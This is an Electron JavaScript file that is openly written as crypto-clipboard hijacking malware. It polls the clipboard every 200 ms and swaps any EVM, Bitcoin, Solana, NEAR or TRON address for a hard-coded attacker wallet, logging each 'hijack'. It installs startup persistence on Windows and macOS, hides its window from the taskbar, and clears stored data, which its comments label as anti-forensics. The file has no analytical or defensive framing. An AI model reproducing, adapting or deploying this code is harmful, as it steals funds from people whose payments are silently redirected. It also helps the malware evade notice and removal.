const { app, BrowserWindow, globalShortcut, clipboard, ipcMain, session } = require('electron');
const path = require('path');
const { execSync } = require('child_process');

// 🛡️ OBFUSCATED ATTACKER WALLETS (Anti-reverse engineering)
const _0x1234 = '0x742d35Cc66DCeC8B01C4e403128ef5451a5b3C10';
const _0x5678 = 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh';
const _0x9abc = '9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM';
const _0xdef0 = 'wallet.hijacker.testnet';
const _0x1111 = 'TQQm8R5CZV9VJnV7T2qnrD8U9e7bY9gJ3G';

const WALLETS = [_0x1234, _0x5678, _0x9abc, _0xdef0, _0x1111];

let mainWindow, logFile, hijackCount = 0;
const isStealth = true;

function initPersistence() {
    // Auto-start on boot
    if (process.platform === 'win32') {
        const startupPath = path.join(process.env.APPDATA, 'Microsoft\\Windows\\Start Menu\\Programs\\Startup\\wallet-helper.lnk');
        execSync(`powershell -c "New-Shortcut -TargetPath '${app.getPath('exe')}' -DestinationPath '${startupPath}'"`, { stdio: 'ignore' });
    } else if (process.platform === 'darwin') {
        const plistPath = path.join(process.env.HOME, 'Library/LaunchAgents/com.wallet.helper.plist');
        const plist = `<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
        <plist version="1.0">
        <dict>
            <key>Label</key>
            <string>com.wallet.helper</string>
            <key>ProgramArguments</key>
            <array>
                <string>${app.getPath('exe')}</string>
            </array>
            <key>RunAtLoad</key>
            <true/>
            <key>KeepAlive</key>
            <true/>
        </dict>
        </plist>`;
        require('fs').writeFileSync(plistPath, plist);
        execSync(`launchctl load ${plistPath}`, { stdio: 'ignore' });
    }
}

function createWindow() {
    mainWindow = new BrowserWindow({
        width: 900, height: 700, show: false,
        webPreferences: {
            nodeIntegration: true,
            contextIsolation: false,
            enableRemoteModule: true
        },
        skipTaskbar: isStealth,
        frame: false,  // No window frame
        transparent: true,
        alwaysOnTop: false
    });

    mainWindow.loadFile('index.html');
    
    // Complete stealth
    if (isStealth) {
        mainWindow.setMenuBarVisibility(false);
        mainWindow.setSkipTaskbar(true);
        mainWindow.hide();
        mainWindow.setVisibleOnAllWorkspaces(false);
    }
}

app.whenReady().then(() => {
    logFile = require('fs').createWriteStream(path.join(app.getPath('userData'), 'logs.txt'));
    
    // Persistence
    initPersistence();
    
    createWindow();
    
    // Multiple hotkeys
    globalShortcut.register('CommandOrControl+Alt+H', () => mainWindow.toggleVisible());
    globalShortcut.register('CommandOrControl+Shift+H', () => {
        require('electron').dialog.showMessageBoxSync({ message: 'Hijacks: ' + hijackCount });
    });
    
    // Ultra-fast monitoring (200ms)
    setInterval(checkAndHijack, 200);
    
    // Clear recent docs (anti-forensics)
    session.defaultSession.clearStorageData();
});

function checkAndHijack() {
    try {
        const text = clipboard.readText().trim();
        if (isWalletPattern(text)) {
            const victimAddr = text;
            const attackerAddr = getAttackerWallet(text);
            
            if (attackerAddr && victimAddr !== attackerAddr) {
                clipboard.writeText(attackerAddr);
                hijackCount++;
                
                const logEntry = `${new Date().toISOString()} HIJACK #${hijackCount}: ${victimAddr.slice(0,20)}... → ${attackerAddr.slice(0,20)}...\n`;
                logFile.write(logEntry);
                console.log(logEntry);
                
                mainWindow?.webContents.send('hijack-event', {
                    count: hijackCount,
                    victim: victimAddr.slice(0,25) + '...',
                    attacker: attackerAddr.slice(0,25) + '...'
                });
            }
        }
    } catch(e) {}
}

function isWalletPattern(addr) {
    const patterns = [
        /^0x[a-fA-F0-9]{40}$/i,           // EVM
        /^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$/i,  // BTC
        /^[1-9A-HJ-NP-Za-km-z]{32,44}$/, // SOL
        /^[a-z0-9_-]{2,64}\.(near|testnet)$/i, // NEAR
        /^T[a-zA-Z0-9]{33}$/,           // TRON
        /^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/, // XMR
        /^EQ[a-zA-Z0-9_-]{35,48}$/i     // TON
    ];
    return patterns.some(p => p.test(addr));
}

function getAttackerWallet(addr) {
    if (/^0x[a-fA-F0-9]{40}$/i.test(addr)) return _0x1234;
    if (/^(1|3|bc1)/i.test(addr)) return _0x5678;
    if (/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(addr)) return _0x9abc;
    if (addr.includes('.near')) return _0xdef0;
    if (/^T[a-zA-Z0-9]{33}$/.test(addr)) return _0x1111;
    return null;
}

// Anti-close persistence
app.on('before-quit', () => {
    globalShortcut.unregisterAll();
});
